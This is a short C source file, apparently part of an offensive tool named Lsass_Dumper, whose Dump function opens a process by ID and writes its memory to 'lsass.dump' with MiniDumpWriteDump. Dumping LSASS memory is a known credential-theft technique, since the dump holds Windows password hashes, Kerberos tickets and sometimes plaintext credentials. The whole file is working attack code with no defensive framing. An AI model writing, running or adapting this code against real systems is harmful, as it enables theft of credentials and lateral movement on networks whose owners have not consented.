#include "Lsass_Dumper.h"

//TODO Might change the access on the file
void Dump(DWORD procId)
{
	LPCWSTR fileNamePointer = L"lsass.dump";
	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, procId);

	if (hProcess)
	{
		HANDLE output = CreateFile(fileNamePointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (MiniDumpWriteDump(hProcess, procId, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL)) succ("lssass has been dumped!");
		else warn("lsass could not be dumped...");

		CloseHandle(hProcess);
	}
	else warn("Invalid handle on the process, error: %lu", GetLastError());
}
